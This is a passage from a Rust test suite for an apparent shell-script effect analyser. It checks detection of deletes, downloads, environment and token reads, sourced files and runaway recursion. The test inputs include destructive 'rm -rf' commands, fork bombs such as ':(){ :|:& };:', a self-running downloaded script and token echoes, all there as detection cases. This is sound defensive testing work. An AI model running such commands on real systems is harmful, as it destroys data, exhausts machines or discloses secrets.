        let plan = shell(source, None);
        let written: Vec<_> = plan
            .effects
            .iter()
            .filter(|e| e.operation.0 == "environment.write")
            .filter_map(|e| match &e.resource {
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::EnvironmentVariable { name },
                } => Some(name.as_str()),
                _ => None,
            })
            .collect();
        assert_eq!(
            written,
            expected.into_iter().collect::<Vec<_>>(),
            "{source}"
        );
        assert_eq!(
            delete_resources(&plan).iter().any(|resource| matches!(
                resource,
                ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/"
            )),
            deletes,
            "{source}: {:?}",
            plan.effects
        );
    }

    let unresolved = shell("mapfile -C \"$CALLBACK\" -c 1 rows <<<'line'", None);
    assert!(delete_resources(&unresolved).is_empty());
    assert!(!unresolved.boundaries.is_empty());
}

#[test]
fn read_variable_is_no_longer_a_known_literal() {
    let plan = shell("D=/data; read D; rm -r \"$D\"", None);
    // The delete must not resolve to the pre-read literal value.
    assert!(delete_resources(&plan)
        .iter()
        .all(|r| !matches!(r, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/data")));
}

#[test]
fn common_builtins_are_effectless() {
    for src in [
        "set -e",
        "test -f x",
        "dirname \"$0\"",
        "basename /a/b",
        "declare -r X=1",
        "local y",
        "pwd",
        "exit 0",
        ":",
        "return 1",
        "shift",
        "alias ll='ls -al'",
        "command printf %s x",
    ] {
        let plan = shell(src, Some("/w"));
        assert!(
            plan.boundaries.is_empty(),
            "{src:?} produced boundaries: {:?}",
            plan.boundaries
        );
    }
}

#[test]
fn exec_nests_into_the_execed_command() {
    let plan = shell("exec php script.php", Some("/w"));
    // The exec'd command is recorded as a nested invocation, not a dead end.
    assert!(plan.execution_graph.nodes.iter().any(|n| matches!(
        &n.subject,
        Subject::Exec { argv, .. } if argv.first().map(String::as_str) == Some("php")
    )));
}

#[test]
fn source_of_a_file_is_an_explicit_boundary() {
    let plan = shell(". ./lib.sh", Some("/w"));
    assert!(
        plan.boundaries
            .iter()
            .any(|b| b.reason.as_str() == "unresolved_source")
    );
}

struct Sources(HashMap<String, String>);

impl SourceResolver for Sources {
    fn source_mutation_disjoint(
        &self,
        _: &effinterp_proto::ResourceExpr,
        _: effinterp_engine::SourceRequest<'_>,
    ) -> bool {
        true
    }

    fn resolve(&self, request: SourceRequest<'_>) -> SourceResponse {
        self.0
            .get(request.path.trim_start_matches('/'))
            .map_or_else(
                || SourceResponse::Refused(SourceRefusal::Unavailable(UnavailableReason::Missing)),
                |source| SourceResponse::Source(source.as_bytes().to_vec()),
            )
    }

    fn siblings(&self, path: &str) -> Option<Vec<String>> {
        let path = path.trim_start_matches('/');
        let parent = path.rsplit_once('/').map_or("", |(parent, _)| parent);
        Some(
            self.0
                .keys()
                .filter(|candidate| {
                    candidate.as_str() != path
                        && candidate
                            .rsplit_once('/')
                            .map_or("", |(candidate_parent, _)| candidate_parent)
                            == parent
                })
                .cloned()
                .collect(),
        )
    }
}

#[test]
fn nested_file_language_relative_cwd_cites_host_context() {
    for (command, path, source) in [
        (
            "go run main.go",
            "repo/child/main.go",
            "package main\nimport \"os\"\nfunc main() { os.Remove(\"x\"); os.Remove(\"/tmp/x\") }",
        ),
        (
            "java Main.java",
            "repo/child/Main.java",
            "class Main { public static void main(String[] args) throws Exception { java.nio.file.Files.delete(java.nio.file.Path.of(\"x\")); java.nio.file.Files.delete(java.nio.file.Path.of(\"/tmp/x\")); } }",
        ),
        (
            "rust-script main.rs",
            "repo/child/main.rs",
            "fn main() { std::fs::remove_file(\"x\").unwrap(); std::fs::remove_file(\"/tmp/x\").unwrap(); }",
        ),
    ] {
        let subject = Subject::Shell {
            source: format!("cd \"$HOME\"; {command}"),
            cwd: Some("/repo".to_string()),
            context: HostContext {
                env: [("HOME".to_string(), "child".to_string())]
                    .into_iter()
                    .collect(),
                ..Default::default()
            },
        };
        let plan = Engine::new()
            .with_causality_detail(true)
            .with_resolver(Box::new(Sources(HashMap::from([(
                path.to_string(),
                source.to_string(),
            )]))))
            .analyze_with_cwds(&subject, Some("repo"), Some("repo"))
            .unwrap();
        validate_plan(&plan).unwrap();
        assert_relative_delete_only_cites_home(&plan);
    }
}

#[test]
fn sourced_functions_and_assignments_persist_with_exact_origin() {
    let subject = Subject::Shell {
        source: ". ./lib/actions.sh\nwipe \"$TARGET\"".to_string(),
        cwd: Some("/work/bin".to_string()),
        context: Default::default(),
    };
    let plan = Engine::new()
        .with_causality_detail(true)
        .with_resolver(Box::new(Sources(HashMap::from([(
            "bin/lib/actions.sh".to_string(),
            "TARGET=/tmp/cache\nwipe() { rm -- \"$1\"; }".to_string(),
        )]))))
        .analyze_with_source_cwd(&subject, Some("bin"))
        .unwrap();
    validate_plan(&plan).unwrap();

    assert!(has_delete(&plan, "/tmp/cache"), "{:?}", plan.effects);
    assert!(
        !plan
            .boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "unresolved_source")
    );
    assert!(plan.execution_graph.nodes.iter().any(|execution| {
        execution.selected_source_path() == Some("bin/lib/actions.sh")
            && execution.boundary.is_none()
    }));
}

#[test]
fn unobserved_source_invalidates_variables_but_observed_source_preserves_them() {
    let unobserved = shell(
        r#"TOOL=echo; source /tmp/unobserved; "$TOOL" -rf /victim"#,
        None,
    );
    assert!(!has_delete(&unobserved, "/victim"));
    assert!(unobserved.effects.iter().any(|effect| {
        effect.operation.0 == "process.exec"
            && matches!(effect.resource, ResourceExpr::Unresolved { .. })
    }));

    let subject = Subject::Shell {
        source: r#"TOOL=rm; source ./known.sh; "$TOOL" -rf /victim"#.into(),
        cwd: Some("/work".into()),
        context: Default::default(),
    };
    let observed = Engine::new()
        .with_resolver(Box::new(Sources(HashMap::from([(
            "known.sh".into(),
            ":".into(),
        )]))))
        .analyze_with_source_cwd(&subject, Some(""))
        .unwrap();
    validate_plan(&observed).unwrap();
    assert!(has_delete(&observed, "/victim"), "{:?}", observed.effects);
}

#[test]
fn sourced_files_preserve_caller_script_identity_and_self_rereads() {
    for head in ["ruby", "\"${RUBY_PATH}\""] {
        let source =
            "#!/bin/sh\n. ./lib.sh\nexit\n#!/usr/bin/env ruby\nFile.delete('/tmp/caller-ruby')\n";
        let library = format!(
            "# {}\nrm -- \"$0.cache\"\n. ./inner.sh\nexec {head} -x \"$0\"\n#!/usr/bin/env ruby\nFile.delete('/tmp/library-ruby')\n",
            "padding".repeat(30)
        );
        let sources = Sources(HashMap::from([
            ("lib.sh".into(), library),
            ("inner.sh".into(), "rm -- \"$0.inner\"".into()),
        ]));
        let plan = Engine::new()
            .with_resolver(Box::new(sources))
            .analyze_with_source_cwd(
                &Subject::Shell {
                    source: source.into(),
                    cwd: Some("/work".into()),
                    context: Default::default(),
                },
                Some(""),
            )
            .unwrap();
        validate_plan(&plan).unwrap();
        assert!(
            has_delete(&plan, "/work/$0.cache"),
            "{head}: {:?} {:?}",
            plan.effects,
            plan.boundaries
        );
        assert!(has_delete(&plan, "/work/$0.inner"));
        assert!(
            has_delete(&plan, "/tmp/caller-ruby"),
            "{head}: {:?}",
            plan.boundaries
        );
        assert!(!has_delete(&plan, "/tmp/library-ruby"));
        assert_eq!(delete_resources(&plan).len(), 3);
    }
}

#[test]
fn dynamic_source_does_not_invent_sourced_definitions() {
    let plan = shell(". \"$LIB\"\nwipe /tmp/cache", Some("/work/bin"));
    assert!(!has_delete(&plan, "/tmp/cache"));
    assert!(
        plan.boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "unresolved_source")
    );
}

#[test]
fn sourced_file_cycle_saturates_a_visible_limit() {
    let mut limits = default_limits();
    limits.insert("max_execution_depth".to_string(), 4);
    let subject = Subject::Shell {
        source: ". ./a.sh".to_string(),
        cwd: Some("/work".to_string()),
        context: Default::default(),
    };
    let plan = Engine::with_limits(limits)
        .unwrap()
        .with_causality_detail(true)
        .with_resolver(Box::new(Sources(HashMap::from([
            ("a.sh".to_string(), ". ./b.sh".to_string()),
            ("b.sh".to_string(), ". ./a.sh".to_string()),
        ]))))
        .analyze_with_source_cwd(&subject, Some(""))
        .unwrap();
    validate_plan(&plan).unwrap();

    assert!(
        plan.boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "execution_cycle")
    );
    assert!(
        plan.execution_graph
            .edges
            .iter()
            .any(|edge| edge.cycle && edge.to.0 < edge.from.0),
        "the exact back edge must remain in the graph"
    );
    assert!(plan.execution_graph.nodes.iter().any(|node| {
        node.assurance == effinterp_proto::ExecutionAssurance::Widened && node.boundary.is_some()
    }));
}

#[test]
fn self_sourced_file_retains_a_valid_cycle_edge() {
    let subject = Subject::Shell {
        source: ". ./a.sh".to_string(),
        cwd: Some("/work".to_string()),
        context: Default::default(),
    };
    let plan = Engine::new()
        .with_causality_detail(true)
        .with_resolver(Box::new(Sources(HashMap::from([(
            "a.sh".to_string(),
            ". ./a.sh".to_string(),
        )]))))
        .analyze_with_source_cwd(&subject, Some(""))
        .unwrap();
    validate_plan(&plan).unwrap();

    assert!(
        plan.execution_graph
            .edges
            .iter()
            .any(|edge| edge.cycle && edge.to == edge.from),
        "the exact self-loop must remain in the graph"
    );
    assert!(
        plan.boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "execution_cycle")
    );
}

#[test]
fn a_staged_script_that_runs_itself_stops_at_the_cycle() {
    // The redirect stages the script's exact bytes, so `bash downloaded.sh`
    // is interpreted from them and runs the same script again. The re-entry
    // is the same context reached through a longer chain of inherited
    // streams, and it must end in the cycle boundary rather than in a
    // saturated depth limit.
    let plan = shell(
        "echo 'bash downloaded.sh' > downloaded.sh; bash downloaded.sh",
        Some("/work"),
    );
    assert!(
        plan.boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "execution_cycle"),
        "{:?}",
        plan.boundaries
    );
    assert!(
        !plan
            .boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "limit_saturated"),
        "{:?}",
        plan.boundaries
    );
    assert_eq!(
        plan.effects
            .iter()
            .filter(|effect| effect.operation.0 == "process.code_execution")
            .count(),
        2,
        "got {:?}",
        ops(&plan)
    );
    assert!(plan.effects.iter().any(|effect| {
        effect.attributes.get("process_growth")
            == Some(&AttrValue::String("unbounded_background_recursion".into()))
    }));

    let replacement = shell(
        "echo 'exec bash downloaded.sh' > downloaded.sh; bash downloaded.sh",
        Some("/work"),
    );
    assert!(replacement.effects.iter().all(|effect| {
        effect.attributes.get("process_growth")
            != Some(&AttrValue::String("unbounded_background_recursion".into()))
    }));
}

#[test]
fn source_larger_than_64k_is_analyzed() {
    // A body well over the old 64 KiB cap, under the new default cap.
    let padding = "true\n".repeat(20_000); // ~100 KiB
    let source = format!("{padding}rm /data\n");
    assert!(source.len() > 64 * 1024);
    let plan = Engine::with_limits(unbounded_steps())
        .unwrap()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source,
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();
    assert!(
        !plan
            .boundaries
            .iter()
            .any(|b| b.limit.as_deref() == Some("max_source_bytes"))
    );
    assert!(has_delete(&plan, "/data"));
}

#[test]
fn called_shell_function_surfaces_body_effects() {
    // A wrapper defined and then invoked in the same script must surface
    // the body's effects at the call site.
    let plan = shell("download() { curl -o /tmp/x https://h/f; }\ndownload", None);
    assert!(
        plan.effects
            .iter()
            .any(|e| e.operation.0.starts_with("network.")),
        "expected a network effect from the called wrapper, got {:?}",
        ops(&plan)
    );
    assert!(
        plan.effects.iter().any(|e| {
            e.operation.0 == "filesystem.write"
                && matches!(
                    &e.resource,
                    ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
                        if path == "/tmp/x"
                )
        }),
        "expected write to /tmp/x, got {:?}",
        plan.effects
    );

    // The `function name { ... }` form resolves the same way.
    let plan = shell(
        "function download { curl -o /tmp/x https://h/f; }\ndownload",
        None,
    );
    assert!(
        plan.effects
            .iter()
            .any(|e| e.operation.0.starts_with("network."))
    );

    // Defined but never called: the body contributes nothing.
    let plan = shell("download() { curl -o /tmp/x https://h/f; }", None);
    assert!(
        plan.effects.is_empty(),
        "defined-but-not-called function produced {:?}",
        ops(&plan)
    );
    assert!(
        !plan
            .boundaries
            .iter()
            .any(|b| b.reason.as_str() == "unsupported_shell_syntax"),
        "function definition should not be an unsupported boundary: {:?}",
        plan.boundaries
    );

    // A call from a command substitution still walks the outer definition
    // (spans belong to the outer source, not the substitution string).
    let plan = shell(
        "download() { curl -o /tmp/x https://h/f; }\necho $(download)",
        None,
    );
    assert!(
        plan.effects
            .iter()
            .any(|e| e.operation.0.starts_with("network.")),
        "function called from a substitution should surface the body, got {:?}",
        ops(&plan)
    );

    // A call before the definition is not resolved (only earlier defs bind).
    let plan = shell("download\ndownload() { curl -o /tmp/x https://h/f; }", None);
    assert!(
        !plan
            .effects
            .iter()
            .any(|e| e.operation.0.starts_with("network.")),
        "call-before-define should not surface the body, got {:?}",
        ops(&plan)
    );
}

#[test]
fn recursive_shell_function_does_not_recurse_forever() {
    // The cycle guard stops re-entry (no hang), but the shell running the
    // function again without bound is evidence: one code execution cited on
    // the recursive call site, and a cycle boundary keeping coverage honest.
    let src = "foo() { foo; }\nfoo";
    let plan = shell(src, None);
    let executions = plan
        .effects
        .iter()
        .filter(|e| e.operation.0 == "process.code_execution")
        .collect::<Vec<_>>();
    assert_eq!(executions.len(), 1, "got {:?}", ops(&plan));
    let call_site = executions[0].provenance.iter().any(|node| {
        matches!(
            plan.provenance[node.0 as usize].kind,
            ProvenanceKind::SourceSpan { start, end } if (start, end) == (8, 11)
        )
    });
    assert!(
        call_site,
        "expected the recursive call span, got {:?}",
        executions[0].provenance
    );
    assert!(
        plan.boundaries
            .iter()
            .any(|b| b.reason.as_str() == "execution_cycle"),
        "expected a cycle boundary, got {:?}",
        plan.boundaries
    );

    // Mutual recursion through a background job is the same cycle.
    let plan = shell("first(){ second & }; second(){ first; }; first", None);
    assert_eq!(
        plan.effects
            .iter()
            .filter(|e| e.operation.0 == "process.code_execution")
            .count(),
        1,
        "got {:?}",
        ops(&plan)
    );
    for (source, grows) in [
        (":(){ :|:& };:", true),
        ("bomb(){ bomb& bomb& }; bomb", true),
        ("bomb(){ bomb & }; bomb", true),
        ("first(){ second & }; second(){ first; }; first", true),
        (
            "first(){ second; }; second(){ third & }; third(){ first; }; first",
            true,
        ),
        ("first(){ second; }; second(){ first; }; first", false),
        ("first(){ second; }; second(){ first; }; first &", false),
        ("f(){ f; f & }; f", false),
        ("f(){ if test -e stop; then return; fi; f & }; f", false),
        ("helper(){ unset -f f; }; f(){ helper; f & }; f", false),
    ] {
        let plan = shell(source, None);
        assert_eq!(
            plan.effects
                .iter()
                .any(|effect| effect.attributes.get("process_growth")
                    == Some(&AttrValue::String("unbounded_background_recursion".into()))),
            grows,
            "{source}: {:?}",
            plan.effects
        );
    }
}

#[test]
fn only_a_loop_that_never_ends_spawns_without_bound() {
    // The loop's condition decides this, so the `while`/`until` polarity and
    // a C-style header's condition have to survive parsing: reading either
    // one backwards turns an ordinary bounded loop into a false fork bomb.
    for (src, unbounded) in [
        ("while true; do work & done", true),
        ("while false; do work & done", false),
        ("until false; do work & done", true),
        ("until true; do work & done", false),
        ("for ((;;)); do work & done", true),
        ("for ((i=0;i<10;i++)); do work & done", false),
        ("while true; do work & wait; work & done", false),
        ("while true; do first & wait; second & done", false),
        ("while true; do first & second & wait -n; done", true),
        // A function of the condition's name decides the condition instead.
        ("true(){ return 1; }; while true; do work & done", false),
    ] {
        let plan = shell(src, None);
        let spawns = plan
            .effects
            .iter()
            .filter(|e| e.operation.0 == "process.code_execution")
            .count();
        assert_eq!(
            spawns > 0,
            unbounded,
            "{src:?} reported {spawns} unbounded spawns, got {:?}",
            ops(&plan)
        );
    }
}

#[test]
fn command_builtin_runs_the_operand() {
    let plan = shell("command curl -o /tmp/x https://h/f", None);
    assert!(
        plan.effects
            .iter()
            .any(|e| e.operation.0.starts_with("network.")),
        "command curl should be curl, got {:?}",
        ops(&plan)
    );
}

#[test]
fn command_v_does_not_run_the_operand() {
    let plan = shell("command -v curl; command -V rm", None);
    assert!(
        !plan
            .effects
            .iter()
            .any(|e| e.operation.0.starts_with("network.") || e.operation.0 == "filesystem.delete"),
        "command -v must not run the looked-up name, got {:?}",
        ops(&plan)
    );
}

#[test]
fn command_v_assignment_recovers_the_executable() {
    let plan = shell(
        "php=\"$(command -v php)\"; exec \"$php\" app.php",
        Some("/w"),
    );
    assert!(
        plan.effects
            .iter()
            .any(|e| e.operation.0 == "filesystem.read"),
        "php from command -v should read its script, got {:?}",
        ops(&plan)
    );
}

#[test]
fn command_v_path_operand_retains_lookup_identity() {
    // The looked-up executable lives wherever PATH resolves it, never in cwd,
    // whether the substitution is used directly or through a variable.
    let plan = shell(
        "rm \"$(command -v jobctl)\"; p=$(command -v x); chmod +x \"$p\"",
        Some("/w"),
    );
    let targets: Vec<_> = plan
        .effects
        .iter()
        .filter(|e| {
            matches!(
                e.operation.0.as_str(),
                "filesystem.delete" | "filesystem.metadata"
            )
        })
        .map(|e| &e.resource)
        .collect();
    assert_eq!(targets.len(), 2, "{:?}", ops(&plan));
    assert!(
        targets
            .iter()
            .all(|r| matches!(r, ResourceExpr::Property { base, .. } if matches!(base.as_ref(), ResourceExpr::Parameter { name } if name == "PATH"))),
        "command -v operands must not resolve against cwd, got {targets:?}"
    );
}

#[test]
fn command_v_survives_a_sibling_unknown_branch() {
    // wp-cli: php="$WP_CLI_PHP" on one branch, command -v php on the other.
    let plan = shell(
        "if [ -n \"$WP_CLI_PHP\" ]; then php=\"$WP_CLI_PHP\"; else php=\"$(command -v php)\"; fi; exec \"$php\" app.php",
        Some("/w"),
    );
    assert!(
        plan.effects
            .iter()
            .any(|e| e.operation.0 == "filesystem.read"),
        "command -v on one branch should still recover php, got {:?}",
        ops(&plan)
    );
}

#[test]
fn conditional_command_name_is_unioned() {
    // nvm_download: NVM_DOWNLOADER is set to curl or wget inside if/elif,
    // then invoked as `command "$NVM_DOWNLOADER"`.
    let plan = shell(
        "d=''; if true; then d='curl'; else d='wget'; fi; command \"$d\" -o /tmp/x https://h/f",
        None,
    );
    assert!(
        plan.effects
            .iter()
            .any(|e| e.operation.0.starts_with("network.")),
        "variable command name assigned on a branch should still resolve, got {:?}",
        ops(&plan)
    );
}

#[test]
fn function_local_command_var_resolves() {
    let plan = shell(
        "download() { d=''; if true; then d='curl'; else d='wget'; fi; command \"$d\" -o /tmp/x https://h/f; }\ndownload",
        None,
    );
    assert!(
        plan.effects
            .iter()
            .any(|e| e.operation.0.starts_with("network.")),
        "command var inside a called function should resolve, got {:?}",
        ops(&plan)
    );
}

fn env_reads(plan: &Plan) -> Vec<&str> {
    plan.effects
        .iter()
        .filter(|e| e.operation.0 == "environment.read")
        .filter_map(|e| match &e.resource {
            ResourceExpr::Concrete {
                identity: ResourceIdentity::EnvironmentVariable { name },
            } => Some(name.as_str()),
            _ => None,
        })
        .collect()
}

#[test]
fn parameter_expansions_are_environment_reads() {
    // rbenv/Homebrew shapes: a plain test, a default expansion, and a trim.
    let plan = shell(
        "[ -z \"${RBENV_ROOT}\" ]; R=\"${HOMEBREW_BREW_GIT_REMOTE:-https://x}\"; T=\"${NONINTERACTIVE-}\"",
        None,
    );
    let reads = env_reads(&plan);
    assert!(reads.contains(&"RBENV_ROOT"), "got {reads:?}");
    assert!(reads.contains(&"HOMEBREW_BREW_GIT_REMOTE"), "got {reads:?}");
    assert!(reads.contains(&"NONINTERACTIVE"), "got {reads:?}");
}

#[test]
fn double_bracket_test_reads_its_expansions() {
    let plan = shell(
        "if [[ -n \"${CI-}\" && -z \"${INTERACTIVE-}\" ]]; then echo x; fi",
        None,
    );
    let reads = env_reads(&plan);
    assert!(reads.contains(&"CI"), "got {reads:?}");
    assert!(reads.contains(&"INTERACTIVE"), "got {reads:?}");
}

#[test]
fn only_a_substituted_value_is_disclosed_to_stdout() {
    // The read happens in every shape; the value reaches stdout only when the
    // expansion substitutes it. `${NAME:+word}` substitutes the alternate
    // word, and a name the supplied environment does not carry is unset.
    for (source, disclosed) in [
        ("echo \"$GITHUB_TOKEN\"", true),
        ("echo \"${GITHUB_TOKEN:+set}\"", false),
        ("echo \"$AWS_SECRET_ACCESS_KEY\"", false),
    ] {
        let plan = Engine::new()
            .analyze(&Subject::Shell {
                source: source.to_string(),
                cwd: Some("/workspace/project".to_string()),
                context: HostContext {
                    env: [("GITHUB_TOKEN".to_string(), "token".to_string())]
                        .into_iter()
                        .collect(),
                    ..Default::default()
                },
            })
            .unwrap();
        let read = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "environment.read")
            .unwrap_or_else(|| panic!("no environment read for {source}"));
        assert_eq!(
            read.attributes.get("output") == Some(&AttrValue::String("stdout".to_string())),
            disclosed,
            "{source} disclosure: {:?}",
            read.attributes
        );
    }
}

#[test]
fn script_set_variable_is_not_an_environment_read() {
    // The script itself set D on every path; expanding it reads no environment.
    let plan = shell("D=/data; rm -r \"$D/logs\"; echo \"${D:-x}\"", None);
    assert!(env_reads(&plan).is_empty(), "got {:?}", env_reads(&plan));
}

#[test]
fn read_after_conditional_assignment_is_still_an_environment_read() {
    // rbenv reads RBENV_DEBUG after `export RBENV_DEBUG=1` behind a flag
    // check: the environment value shows through on the other path.
    let plan = shell(
        "if [ \"$1\" = --debug ]; then export RBENV_DEBUG=1; fi\nif [ -n \"$RBENV_DEBUG\" ]; then echo on; fi",
        None,
    );
    assert!(env_reads(&plan).contains(&"RBENV_DEBUG"));
}

#[test]
fn read_inside_the_assigning_region_is_not_an_environment_read() {
    // Within one case arm the assignment precedes the read on every path.
    let plan = shell(
        "case \"$1\" in x) p=\"$(type -P foo)\"; [ -z \"$p\" ] && echo missing;; esac",
        None,
    );
    assert!(
        !env_reads(&plan).contains(&"p"),
        "got {:?}",
        env_reads(&plan)
    );
}

#[test]
fn environment_reads_are_deduplicated_per_name() {
    let plan = shell("echo \"$HOME\"; echo \"$HOME\"; cat \"$HOME/.x\"", None);
    assert_eq!(env_reads(&plan), vec!["HOME"]);
}

#[test]
fn shell_internal_variables_are_not_environment_reads() {
    let plan = shell("echo \"$PWD\" \"$RANDOM\" \"${BASH_SOURCE:-$0}\"", None);
    assert!(env_reads(&plan).is_empty(), "got {:?}", env_reads(&plan));
}

#[test]
fn local_declaration_is_not_an_environment_read() {
    let plan = shell(
        "f() { local out; [ -n \"$1\" ] && out=$1; echo \"$out\"; }\nf x",
        None,
    );
    assert!(
        !env_reads(&plan).contains(&"out"),
        "got {:?}",
        env_reads(&plan)
    );
}

#[test]
fn loop_variable_is_not_an_environment_read() {
    let plan = shell("for f in a b; do echo \"$f\"; done", None);
    assert!(env_reads(&plan).is_empty(), "got {:?}", env_reads(&plan));
}

fn exec_resources(plan: &Plan) -> Vec<String> {
    plan.effects
        .iter()
        .filter(|e| e.operation.0 == "process.exec")
        .map(|e| format!("{:?}", e.resource))
        .collect()
}

#[test]
fn wrapper_function_argv_resolves_through_positional_splice() {
    // Homebrew's execute(): the wrapper's arguments are the real argv.
    let plan = shell(
        "execute() { if ! \"$@\"; then exit 1; fi; }\nexecute ln -sf a /usr/local/bin/b",
        None,
    );
    assert!(
        exec_resources(&plan).iter().any(|r| r.contains("\"ln\"")),
        "got {:?}",
        exec_resources(&plan)
    );
}

#[test]
fn shell_function_frames_do_not_widen_literal_commands() {
    let mut limits = default_limits();
    limits.insert("max_execution_depth".to_string(), 2);
    let analyze = |command: &str| {
        let source = format!(
            "run() {{ local cmd=\"$1\"; command \"$cmd\" -o /tmp/x https://h/f; }}\nwrap() {{ local result=\"$(run \"$1\")\"; }}\nwrap {command}"
        );
        Engine::with_limits(limits.clone())
            .unwrap()
            .with_causality_detail(true)
            .analyze(&Subject::Shell {
                source,
                cwd: None,
                context: Default::default(),
            })
            .unwrap()
    };

    let literal = analyze("curl");
    assert!(
        exec_resources(&literal)
            .iter()
            .any(|r| r.contains("\"curl\"")),
        "literal command widened through shell functions: {:?}",
        exec_resources(&literal)
    );
    assert!(
        literal
            .boundaries
            .iter()
            .any(|boundary| boundary.limit.as_deref() == Some("max_execution_depth"))
    );
    let dynamic = analyze("\"$TOOL\"");
    let dynamic_execs: Vec<_> = dynamic
        .effects
        .iter()
        .filter(|effect| effect.operation.0 == "process.exec")
        .collect();
    assert!(
        !dynamic_execs.is_empty()
            && dynamic_execs
                .iter()
                .all(|effect| matches!(effect.resource, ResourceExpr::Unresolved { .. })),
        "input-determined command should stay unresolved: {:?}",
        exec_resources(&dynamic)
    );
}

#[test]
fn shell_function_depth_limit_is_named_and_rate_limited() {
    let mut limits = default_limits();
    limits.insert("max_shell_function_depth".to_string(), 2);
    let plan = Engine::with_limits(limits)
        .unwrap().with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: "c() { curl -o /tmp/x https://h/f; }\nb() { c; c; one >/dev/null; local tool=tar; command \"$tool\" -xf archive; }\na() { b; b; }\na".to_string(),
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();

    assert_eq!(
        plan.boundaries
            .iter()
            .filter(|boundary| { boundary.limit.as_deref() == Some("max_shell_function_depth") })
            .count(),
        1
    );
    assert!(
        exec_resources(&plan).iter().any(|r| r.contains("\"tar\"")),
        "source-local command after the refused call was lost: {:?}",
        exec_resources(&plan)
    );
    assert_eq!(
        plan.effects
            .iter()
            .filter(|effect| {
                effect.operation.0 == "filesystem.write"
                    && matches!(
                        &effect.resource,
                        ResourceExpr::Concrete {
                            identity: ResourceIdentity::FsPath { path }
                        } if path == "/dev/null"
                    )
            })
            .count(),
        2
    );
}

#[test]
fn saturated_execution_memoizes_composed_function_heads() {
    let mut limits = default_limits();
    limits.insert("max_execution_nodes".to_string(), 2);
    let plan = Engine::with_limits(limits)
        .unwrap().with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: "deeper() { curl -o /tmp/x https://h/f; }\nhelper() { deeper; local tool=tar; command \"$tool\" -xf archive; }\nouter() { one; two; three >/tmp/ignored; helper; helper; }\nouter".to_string(),
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();

    assert!(
        exec_resources(&plan).iter().any(|r| r.contains("\"tar\"")),
        "local literal command was lost after saturation: {:?}",
        exec_resources(&plan)
    );
    assert_eq!(
        exec_resources(&plan)
            .iter()
            .filter(|resource| resource.contains("\"curl\""))
            .count(),
        1,
        "repeated saturated function input was walked again: {:?}",
        exec_resources(&plan)
    );
    assert!(!plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.write"
            && matches!(
                &effect.resource,
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::FsPath { path }
                } if path == "/tmp/ignored"
            )
    }));
}

#[test]
fn saturated_function_calls_follow_expanded_command_heads() {
    let mut limits = default_limits();
    limits.insert("max_execution_nodes".to_string(), 0);

    for source in [
        "sh -c true; child() { rm -rf /x; }; parent() { C=child; $C; }; parent | cat",
        "sh -c true; child() { rm -rf /x; }; parent() { E=; $E child; }; parent | cat",
        "sh -c true; child() { rm -rf /x; }; C=child; parent() { $C; }; parent | cat",
        "sh -c true; child() { rm -rf /x; }; parent() { E=; C=; C+=child; $E $C; }; parent | cat",
        "sh -c true; child() { rm -rf /x; }; parent() { E=; C=chi; $E ${C}ld; }; parent | cat",
        "sh -c true; child() { rm -rf /caller; }; C=chi; parent() { E=; $E ${C}ld; }; parent | cat",
        "sh -c true; child() { rm -rf /x; }; parent() { D='local C=child'; $D; $C; }; parent | cat",
        "sh -c true; child() { rm -rf /restored; }; parent() { IFS=:; IFS=' \t\n'; D='local C=child'; $D; $C; }; parent | cat",
        "sh -c true; child() { rm -rf /x; }; parent() { E=; C=chi; C+=ld; $E $C; }; parent | cat",
    ] {
        let plan = Engine::with_limits(limits.clone())
            .unwrap()
            .with_causality_detail(true)
            .analyze(&Subject::Shell {
                source: source.to_string(),
                cwd: None,
                context: Default::default(),
            })
            .unwrap();
        validate_plan(&plan).unwrap();

        assert!(
            plan.effects.iter().any(|effect| {
                effect.operation.0 == "process.exec"
                    && matches!(
                        &effect.resource,
                        ResourceExpr::Concrete {
                            identity: ResourceIdentity::Process { executable, .. }
                        } if executable == "rm"
                    )
            }),
            "expanded function call was lost after saturation for {source:?}: {:?}",
            exec_resources(&plan)
        );
    }
}

#[test]
fn saturated_function_fanout_cannot_fill_the_effect_budget() {
    let mut source = "f8() { \"$1\" --flag; }\n".to_string();
    for level in (1..8).rev() {
        let next = level + 1;
        source.push_str(&format!(
            "f{level}() {{ f{next} \"$1-a\"; f{next} \"$1-b\"; f{next} \"$1-c\"; f{next} \"$1-d\"; }}\n"
        ));
    }
    source.push_str("one; two; f1 seed; late_tool --flag");

    let mut limits = unbounded_steps();
    limits.insert("max_execution_nodes".to_string(), 1);
    let plan = Engine::with_limits(limits)
        .unwrap()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source,
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();

    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "process.exec"
            && matches!(
                &effect.resource,
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::Process { executable, .. }
                } if executable.starts_with("seed-")
            )
    }));
    assert!(
        exec_resources(&plan)
            .iter()
            .any(|resource| resource.contains("\"late_tool\"")),
        "late source-local command was starved: {:?}",
        exec_resources(&plan)
    );
    assert!(
        plan.effects.len() < default_limits()["max_effects"] as usize,
        "saturated function composition filled the effect budget"
    );
    assert!(!plan.boundaries.iter().any(|boundary| {
        boundary.reason.as_str() == "limit_saturated"
            && boundary.limit.as_deref() == Some("max_effects")
    }));
}

#[test]
fn saturated_repeated_call_sites_stop_before_rebuilding_large_keys() {
    let mut source = String::new();
